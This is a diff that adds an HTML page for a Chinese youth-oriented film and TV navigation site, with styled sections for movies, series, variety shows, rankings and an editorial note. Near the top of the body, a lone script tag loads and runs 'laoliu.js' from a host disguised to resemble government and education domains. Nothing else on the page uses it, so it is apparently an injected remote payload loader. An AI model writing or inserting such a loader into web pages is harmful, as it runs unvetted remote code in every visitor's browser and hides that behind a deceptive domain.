@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>年轻人电影网 - 年轻人的观影指南</title>
+<meta name="description" content="年轻人电影网（nianqingrendianyingwang-h5）年轻人的专属影视导航：最新电影、热播剧、综艺、动漫，潮流杂志风UI，手机电脑全适配，必应收录友好。">
+<meta name="keywords" content="年轻人电影网, nianqingrendianyingwang-h5, 电影, 电视剧, 综艺, 动漫, 在线观看, 年轻潮流, 影视导航">
+<meta name="author" content="年轻人电影网">
+<meta name="robots" content="index, follow">
+<style>
+:root{
+  --cream:#fffdf8;
+  --paper:#f8f5f0;
+  --orange:#ff5a36;
+  --green:#1a5c4a;
+  --dark:#1c1c1c;
+  --gray:#8a8a8a;
+  --line:#e0dcd4;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--cream);
+  color:var(--dark);
+  line-height:1.75;
+  overflow-x:hidden;
+}
+
+a{color:var(--orange);text-decoration:none;transition:.3s}
+a:hover{color:var(--green)}
+
+/* 顶部杂志刊头 */
+.masthead{
+  background:var(--cream);
+  border-bottom:3px double var(--dark);
+  padding:16px 20px;
+  position:sticky;top:0;z-index:1000;
+}
+.mast-inner{
+  max-width:1200px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.issue{
+  text-align:center;flex:1;
+}
+.issue .vol{
+  font-size:10px;letter-spacing:4px;color:var(--gray);text-transform:uppercase;
+}
+.issue h1{
+  font-size:clamp(24px,5vw,38px);font-weight:900;
+  letter-spacing:2px;margin:2px 0;
+}
+.issue h1 span{color:var(--orange)}
+.issue .date{font-size:11px;color:var(--gray);letter-spacing:2px}
+.brand-side{font-size:11px;color:var(--gray);writing-mode:vertical-rl;letter-spacing:3px}
+.nav-list{
+  display:flex;list-style:none;gap:2px;
+}
+.nav-list a{
+  padding:8px 14px;font-size:13px;font-weight:700;
+  color:var(--dark);border-radius:4px;
+}
+.nav-list a:hover,.nav-list a.active{
+  background:var(--orange);color:#fff;
+}
+.nav-btn{display:none;background:none;border:none;font-size:22px;cursor:pointer;color:var(--dark)}
+
+/* Hero 杂志封面 */
+.cover{
+  max-width:1200px;margin:0 auto;padding:40px 20px 50px;
+}
+.cover-grid{
+  display:grid;grid-template-columns:1.2fr .8fr;gap:24px;
+  align-items:center;
+}
+.cover-main{
+  background:var(--green);color:#fff;padding:50px 40px;
+  border-radius:4px;position:relative;overflow:hidden;
+}
+.cover-main .kicker{
+  font-size:12px;letter-spacing:3px;text-transform:uppercase;
+  color:rgba(255,255,255,.7);margin-bottom:12px;
+}
+.cover-main h2{
+  font-size:clamp(28px,5vw,44px);font-weight:900;line-height:1.2;margin-bottom:16px;
+}
+.cover-main h2 em{color:var(--orange);font-style:normal}
+.cover-main p{font-size:15px;opacity:.85;max-width:380px;margin-bottom:24px}
+.cover-main .btn{
+  display:inline-block;background:var(--orange);color:#fff;
+  padding:14px 34px;border-radius:30px;font-weight:700;font-size:15px;
+}
+.cover-main .btn:hover{background:#fff;color:var(--green)}
+.cover-side{
+  display:flex;flex-direction:column;gap:16px;
+}
+.cover-side .side-card{
+  background:var(--paper);border:1px solid var(--line);
+  border-radius:4px;padding:18px;transition:.3s;
+}
+.cover-side .side-card:hover{border-color:var(--orange);transform:translateX(6px)}
+.side-card .tag{
+  font-size:10px;font-weight:700;letter-spacing:1px;color:var(--orange);
+  text-transform:uppercase;margin-bottom:6px;
+}
+.side-card h4{font-size:15px;margin-bottom:4px}
+.side-card p{font-size:12px;color:var(--gray)}
+
+/* 区块 */
+.section{max-width:1200px;margin:0 auto;padding:48px 20px}
+.sec-head{
+  display:flex;align-items:baseline;justify-content:space-between;
+  border-bottom:2px solid var(--dark);padding-bottom:10px;margin-bottom:28px;
+}
+.sec-head h2{
+  font-size:clamp(20px,4vw,26px);font-weight:900;letter-spacing:1px;
+}
+.sec-head h2 small{font-size:11px;color:var(--orange);letter-spacing:2px;margin-right:8px}
+.sec-head a{font-size:13px;color:var(--gray)}
+
+/* 电影：杂志封面排版 */
+.mag-grid{
+  display:grid;grid-template-columns:repeat(4,1fr);grid-auto-rows:minmax(200px,auto);gap:18px;
+}
+.mag-item{
+  position:relative;overflow:hidden;border-radius:4px;
+  background:var(--paper);border:1px solid var(--line);transition:.35s;
+}
+.mag-item:hover{box-shadow:0 12px 30px rgba(0,0,0,.1);transform:translateY(-4px)}
+.mag-item.feature{grid-column:span 2;grid-row:span 2}
+.mag-item .img{
+  width:100%;height:100%;min-height:160px;
+  display:flex;align-items:center;justify-content:center;font-size:44px;
+  background:linear-gradient(135deg,#e8e4dc,#f0ede6);
+}
+.mag-item.feature .img{font-size:72px;min-height:280px}
+.mag-item .caption{
+  padding:12px 14px;background:var(--cream);
+}
+.mag-item .caption .cat{font-size:10px;color:var(--orange);font-weight:700;letter-spacing:1px;text-transform:uppercase}
+.mag-item .caption h3{font-size:14px;font-weight:700;margin-top:2px}
+.mag-item.feature .caption h3{font-size:20px}
+
+/* 电视剧：Tab */
+.tabs{
+  display:flex;gap:4px;border-bottom:2px solid var(--line);margin-bottom:20px;flex-wrap:wrap;
+}
+.tab-btn{
+  padding:10px 20px;border:none;background:none;cursor:pointer;
+  font-size:14px;font-weight:700;color:var(--gray);border-bottom:3px solid transparent;
+  margin-bottom:-2px;
+}
+.tab-btn.active{color:var(--orange);border-bottom-color:var(--orange)}
+.tab-panel{display:none}
+.tab-panel.active{display:block}
+.tv-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;
+}
+.tv-card{
+  display:flex;gap:12px;background:var(--paper);border:1px solid var(--line);
+  border-radius:4px;padding:12px;transition:.3s;align-items:center;
+}
+.tv-card:hover{border-color:var(--green);background:#fff}
+.tv-card .ep{font-size:24px;font-weight:900;color:var(--orange);flex-shrink:0;width:36px}
+.tv-card h4{font-size:14px;margin-bottom:2px}
+.tv-card span{font-size:11px;color:var(--gray)}
+
+/* 综艺动漫：色块剪贴 */
+.collage{
+  display:grid;grid-template-columns:repeat(4,1fr);grid-auto-rows:120px;gap:8px;
+}
+.collage-item{
+  display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;
+  border-radius:4px;transition:.3s;cursor:pointer;padding:10px;
+}
+.collage-item:hover{transform:scale(1.04);z-index:2;box-shadow:0 8px 20px rgba(0,0,0,.12)}
+.collage-item.c1{background:var(--orange);color:#fff;grid-column:span 2;grid-row:span 2}
+.collage-item.c2{background:var(--green);color:#fff}
+.collage-item.c3{background:#f0e6d8;color:var(--dark)}
+.collage-item.c4{background:#1c1c1c;color:#fff}
+.collage-item.c5{background:#e8d5c8;color:var(--dark)}
+.collage-item.c6{background:var(--orange);color:#fff;grid-column:span 2}
+.collage-item.c7{background:var(--green);color:#fff}
+.collage-item.c8{background:#f0e6d8;color:var(--dark)}
+.collage-item.c9{background:#1c1c1c;color:#fff}
+.collage-item .em{font-size:30px;margin-bottom:4px}
+.collage-item.c1 .em{font-size:48px}
+.collage-item h4{font-size:13px;font-weight:700}
+.collage-item.c1 h4{font-size:18px}
+.collage-item span{font-size:10px;opacity:.8}
+
+/* 排行榜：大字报 */
+.bigboard{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
+.board-item{
+  display:flex;align-items:center;gap:18px;
+  background:var(--paper);border:1px solid var(--line);border-radius:4px;
+  padding:20px;transition:.3s;
+}
+.board-item:hover{border-color:var(--orange);background:#fff;transform:translateX(6px)}
+.board-item .big-no{
+  font-size:48px;font-weight:900;line-height:1;color:var(--line);
+}
+.board-item:nth-child(1) .big-no,.board-item:nth-child(2) .big-no,.board-item:nth-child(3) .big-no{
+  color:var(--orange);
+}
+.board-item .info h4{font-size:16px;font-weight:700}
+.board-item .info .progress{
+  margin-top:6px;height:5px;background:var(--line);border-radius:3px;overflow:hidden;width:140px;
+}
+.board-item .info .progress i{
+  display:block;height:100%;background:var(--orange);border-radius:3px;
+}
+.board-item .score{margin-left:auto;font-size:20px;font-weight:900;color:var(--green)}
+
+/* 关于：编辑寄语 */
+.editorial{
+  display:grid;grid-template-columns:200px 1fr;gap:30px;
+  background:var(--paper);border:1px solid var(--line);border-radius:4px;padding:36px;
+}
+.editor-portrait{
+  text-align:center;
+}
+.editor-portrait .avatar{
+  width:120px;height:120px;border-radius:50%;
+  background:linear-gradient(135deg,var(--orange),var(--green));
+  display:flex;align-items:center;justify-content:center;font-size:48px;margin:0 auto 12px;
+}
+.editor-portrait h4{font-size:14px;font-weight:700}
+.editor-portrait span{font-size:11px;color:var(--gray)}
+.editorial-body h3{
+  font-size:20px;font-weight:900;margin-bottom:14px;
+  border-left:4px solid var(--orange);padding-left:12px;
+}
+.editorial-body p{font-size:14px;color:#444;margin-bottom:10px;line-height:1.9}
+.editor-links{margin-top:20px;display:flex;gap:10px;flex-wrap:wrap}
+.editor-links a{
+  padding:8px 16px;border:1px solid var(--line);border-radius:20px;font-size:13px;color:var(--dark);font-weight:600;
+}
+.editor-links a:hover{border-color:var(--orange);color:var(--orange)}
+
+/* 页脚 */
+.footer{
+  border-top:3px double var(--dark);padding:30px 20px;text-align:center;background:var(--cream);
+}
+.footer .footer-brand{font-size:20px;font-weight:900;letter-spacing:2px;margin-bottom:10px}
+.footer .footer-brand span{color:var(--orange)}
+.footer p{font-size:12px;color:var(--gray);margin-bottom:6px}
+.footer a{color:var(--gray);margin:0 5px}
+.footer a:hover{color:var(--orange)}
+
+/* 响应式 */
+@media(max-width:900px){
+  .cover-grid{grid-template-columns:1fr}
+  .mag-grid{grid-template-columns:repeat(2,1fr)}
+  .collage{grid-template-columns:repeat(2,1fr)}
+  .editorial{grid-template-columns:1fr;text-align:center}
+}
+@media(max-width:700px){
+  .nav-list{
+    display:none;position:absolute;top:100%;left:0;right:0;
+    flex-direction:column;background:var(--cream);border-bottom:2px solid var(--dark);
+  }
+  .nav-list.open{display:flex}
+  .nav-list a{padding:14px 20px;border-radius:0}
+  .nav-btn{display:block}
+  .brand-side{display:none}
+  .mag-item.feature{grid-column:span 2;grid-row:span 1}
+  .mag-item.feature .img{font-size:48px;min-height:180px}
+  .mag-item.feature .caption h3{font-size:16px}
+}
+@media(max-width:480px){
+  .cover-main{padding:30px 24px}
+  .section{padding:32px 16px}
+  .mag-grid{grid-template-columns:repeat(2,1fr);gap:10px}
+  .mag-item .img{font-size:32px;min-height:120px}
+  .mag-item .caption h3{font-size:12px}
+  .tv-grid{grid-template-columns:1fr}
+  .bigboard{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 刊头 -->
+<header class="masthead">
+  <div class="mast-inner">
+    <div class="brand-side">VOL.2026</div>
+    <div class="issue">
+      <div class="vol">FILM &amp; TV NAVIGATION</div>
+      <h1>年轻人<span>电影网</span></h1>
+      <div class="date">NIANQINGRENDIANYINGWANG-H5 · 2026 ISSUE</div>
+    </div>
+    <nav>
+      <ul class="nav-list" id="navList">
+        <li><a href="#home" class="active">封面</a></li>
+        <li><a href="#movies">电影</a></li>
+        <li><a href="#tv">剧集</a></li>
+        <li><a href="#ent">综艺动漫</a></li>
+        <li><a href="#rank">榜单</a></li>
+        <li><a href="#about">编辑部</a></li>
+      </ul>
+      <button class="nav-btn" id="navBtn">☰</button>
+    </nav>
+  </div>
+</header>
+
+<!-- 封面 -->
+<section class="cover" id="home">
+  <div class="cover-grid">
+    <div class="cover-main">
+      <div class="kicker">THIS WEEK'S FEATURE</div>
+      <h2>年轻人的<br><em>观影新选择</em></h2>
+      <p>年轻人电影网（nianqingrendianyingwang-h5）收录最新电影、剧集、综艺、动漫资源，潮流排版、轻松好找，手机刷剧无压力。</p>
+      <a href="#movies" class="btn">翻到下一页 →</a>
+    </div>
+    <div class="cover-side">
+      <div class="side-card">
+        <div class="tag">EDITOR'S PICK</div>
+        <h4>本周口碑最高</h4>
+        <p>独立电影、海外佳片一网打尽</p>
+      </div>
+      <div class="side-card">
+        <div class="tag">TRENDING NOW</div>
+        <h4>年轻人都在看</h4>
+        <p>热播剧集实时更新，追剧不落伍</p>
+      </div>
+      <div class="side-card">
+        <div class="tag">QUICK ACCESS</div>
+        <h4>手机友好</h4>
+        <p>自适应设计，竖屏刷片超顺畅</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 电影 -->
+<section class="section" id="movies">
+  <div class="sec-head"><h2><small>01</small>电影 FEATURE</h2><a href="#">MORE →</a></div>
+  <div class="mag-grid">
+    <div class="mag-item feature">
+      <div class="img">🎬</div>
+      <div class="caption"><div class="cat">FEATURED</div><h3>青春方程式</h3></div>
+    </div>
+    <div class="mag-item">
+      <div class="img">🎭</div>
+      <div class="caption"><div class="cat">DRAMA</div><h3>她说</h3></div>
+    </div>
+    <div class="mag-item">
+      <div class="img">🚀</div>
+      <div class="caption"><div class="cat">SCI-FI</div><h3>明日边缘 2</h3></div>
+    </div>
+    <div class="mag-item">
+      <div class="img">💕</div>
+      <div class="caption"><div class="cat">ROMANCE</div><h3>夏日友晴天</h3></div>
+    </div>
+    <div class="mag-item">
+      <div class="img">😂</div>
+      <div class="caption"><div class="cat">COMEDY</div><h3>社畜联盟</h3></div>
+    </div>
+    <div class="mag-item feature">
+      <div class="img">🏄</div>
+      <div class="caption"><div class="cat">ADVENTURE</div><h3>海岸线计划</h3></div>
+    </div>
+    <div class="mag-item">
+      <div class="img">🎵</div>
+      <div class="caption"><div class="cat">MUSIC</div><h3>街头节拍</h3></div>
+    </div>
+    <div class="mag-item">
+      <div class="img">🌙</div>
+      <div class="caption"><div class="cat">MYSTERY</div><h3>午夜电台</h3></div>
+    </div>
+  </div>
+</section>
+
+<!-- 电视剧 -->
+<section class="section" id="tv" style="background:var(--paper)">
+  <div class="sec-head"><h2><small>02</small>剧集 SERIES</h2><a href="#">MORE →</a></div>
+  <div class="tabs">
+    <button class="tab-btn active" data-tab="hot">🔥 热播中</button>
+    <button class="tab-btn" data-tab="new">✨ 即将开播</button>
+    <button class="tab-btn" data-tab="end">✅ 经典完结</button>
+  </div>
+  <div class="tab-panel active" id="tab-hot">
+    <div class="tv-grid">
+      <div class="tv-card"><div class="ep">01</div><div><h4>二十不惑 3</h4><span>都市青春 · 24集</span></div></div>
+      <div class="tv-card"><div class="ep">02</div><div><h4>去有风的地方 2</h4><span>治愈生活 · 32集</span></div></div>
+      <div class="tv-card"><div class="ep">03</div><div><h4>我的少年时代</h4><span>校园青春 · 28集</span></div></div>
+      <div class="tv-card"><div class="ep">04</div><div><h4>城市冒险家</h4><span>职场悬疑 · 20集</span></div></div>
+      <div class="tv-card"><div class="ep">05</div><div><h4>恋爱选择题</h4><span>都市爱情 · 18集</span></div></div>
+      <div class="tv-card"><div class="ep">06</div><div><h4>街头篮球手</h4><span>运动青春 · 22集</span></div></div>
+    </div>
+  </div>
+  <div class="tab-panel" id="tab-new">
+    <div class="tv-grid">
+      <div class="tv-card"><div class="ep">07</div><div><h4>夏日友人帐</h4><span>治愈奇幻 · 待播</span></div></div>
+      <div class="tv-card"><div class="ep">08</div><div><h4>银河补习班</h4><span>科幻校园 · 待播</span></div></div>
+      <div class="tv-card"><div class="ep">09</div><div><h4>24小时咖啡馆</h4><span>都市单元 · 待播</span></div></div>
+    </div>
+  </div>
+  <div class="tab-panel" id="tab-end">
+    <div class="tv-grid">
+      <div class="tv-card"><div class="ep">10</div><div><h4>最好的我们</h4><span>校园经典 · 24集</span></div></div>
+      <div class="tv-card"><div class="ep">11</div><div><h4>请回答 1988</h4><span>怀旧温情 · 20集</span></div></div>
+      <div class="tv-card"><div class="ep">12</div><div><h4>琅琊榜</h4><span>古装权谋 · 54集</span></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 综艺动漫 -->
+<section class="section" id="ent">
+  <div class="sec-head"><h2><small>03</small>综艺 · 动漫</h2><a href="#">MORE →</a></div>
+  <div class="collage">
+    <div class="collage-item c1"><div class="em">🎤</div><h4>青春有你 5</h4><span>偶像竞演</span></div>
+    <div class="collage-item c2"><div class="em">⚡</div><h4>斗罗大陆</h4><span>玄幻热血</span></div>
+    <div class="collage-item c3"><div class="em">🍜</div><h4>深夜食堂</h4><span>治愈美食</span></div>
+    <div class="collage-item c4"><div class="em">🎮</div><h4>电竞青春</h4><span>热血竞技</span></div>
+    <div class="collage-item c5"><div class="em">🏕️</div><h4>露营日记</h4><span>户外真人秀</span></div>
+    <div class="collage-item c6"><div class="em">🧚</div><h4>狐妖小红娘</h4><span>国漫恋爱</span></div>
+    <div class="collage-item c7"><div class="em">🎯</div><h4>大侦探</h4><span>推理综艺</span></div>
+    <div class="collage-item c8"><div class="em">🌟</div><h4>天官赐福</h4><span>古风动漫</span></div>
+    <div class="collage-item c9"><div class="em">📸</div><h4>街拍日记</h4><span>潮流综艺</span></div>
+  </div>
+</section>
+
+<!-- 排行榜 -->
+<section class="section" id="rank" style="background:var(--paper)">
+  <div class="sec-head"><h2><small>04</small>热榜 RANKING</h2><a href="#">MORE →</a></div>
+  <div class="bigboard">
+    <div class="board-item">
+      <div class="big-no">01</div>
+      <div class="info"><h4>青春方程式</h4><div class="progress"><i style="width:99%"></i></div></div>
+      <div class="score">9.9</div>
+    </div>
+    <div class="board-item">
+      <div class="big-no">02</div>
+      <div class="info"><h4>二十不惑 3</h4><div class="progress"><i style="width:96%"></i></div></div>
+      <div class="score">9.6</div>
+    </div>
+    <div class="board-item">
+      <div class="big-no">03</div>
+      <div class="info"><h4>去有风的地方 2</h4><div class="progress"><i style="width:94%"></i></div></div>
+      <div class="score">9.4</div>
+    </div>
+    <div class="board-item">
+      <div class="big-no">04</div>
+      <div class="info"><h4>青春有你 5</h4><div class="progress"><i style="width:91%"></i></div></div>
+      <div class="score">9.1</div>
+    </div>
+    <div class="board-item">
+      <div class="big-no">05</div>
+      <div class="info"><h4>斗罗大陆</h4><div class="progress"><i style="width:88%"></i></div></div>
+      <div class="score">8.8</div>
+    </div>
+    <div class="board-item">
+      <div class="big-no">06</div>
+      <div class="info"><h4>夏日友晴天</h4><div class="progress"><i style="width:85%"></i></div></div>
+      <div class="score">8.5</div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="section" id="about">
+  <div class="sec-head"><h2><small>05</small>编辑部 LETTER</h2></div>
+  <div class="editorial">
+    <div class="editor-portrait">
+      <div class="avatar">📝</div>
+      <h4>编辑部</h4>
+      <span>EDITORIAL TEAM</span>
+    </div>
+    <div class="editorial-body">
+      <h3>致年轻观众的一封信</h3>
+      <p>年轻人电影网（nianqingrendianyingwang-h5）是一个为年轻人打造的影视导航站。我们相信，好的电影和剧集应该被轻松找到，而不是淹没在信息噪音里。</p>
+      <p>本站收录最新电影、热播剧、综艺和动漫资源入口，排版简洁、访问迅速，手机电脑都能流畅使用。所有资源来自互联网公开分享，本站仅做导航，不存储任何视频文件。</p>
+      <div class="editor-links">
+        <a href="#">免责声明</a>
+        <a href="#">联系编辑部</a>
+        <a href="#">友情链接</a>
+        <a href="#">投稿推荐</a>
+        <a href="#">反馈意见</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+  <div class="footer-brand">年轻人<span>电影网</span></div>
+  <p>NIANQINGRENDIANYINGWANG-H5 · YOUNG PEOPLE'S FILM GUIDE</p>
+  <p>
+    <a href="#home">封面</a> |
+    <a href="#movies">电影</a> |
+    <a href="#tv">剧集</a> |
+    <a href="#ent">综艺动漫</a> |
+    <a href="#rank">榜单</a> |
+    <a href="#about">编辑部</a>
+  </p>
+  <p>官网：<a href="https://nianqingrendianyingwang-h5.github.io" style="color:var(--orange)">https://nianqingrendianyingwang-h5.github.io</a></p>
+  <p>© 2026 年轻人电影网 · All Rights Reserved</p>
+</footer>
+
+<script>
+// 移动端菜单
+document.getElementById('navBtn').addEventListener('click',()=>{
+  document.getElementById('navList').classList.toggle('open');
+});
+
+// Tab 切换
+document.querySelectorAll('.tab-btn').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+    document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('tab-'+btn.dataset.tab).classList.add('active');
+  });
+});
+
+// 滚动高亮
+const secs=document.querySelectorAll('section[id]');
+const links=document.querySelectorAll('.nav-list a');
+addEventListener('scroll',()=>{
+  let cur='home';
+  secs.forEach(s=>{if(scrollY>=s.offsetTop-100)cur=s.id});
+  links.forEach(l=>{l.classList.remove('active');if(l.getAttribute('href')==='#'+cur)l.classList.add('active')});
+});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',e=>{
+    e.preventDefault();
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t)t.scrollIntoView({behavior:'smooth',block:'start'});
+    document.getElementById('navList').classList.remove('open');
+  });
+});
+</script>
+</body>
+</html>
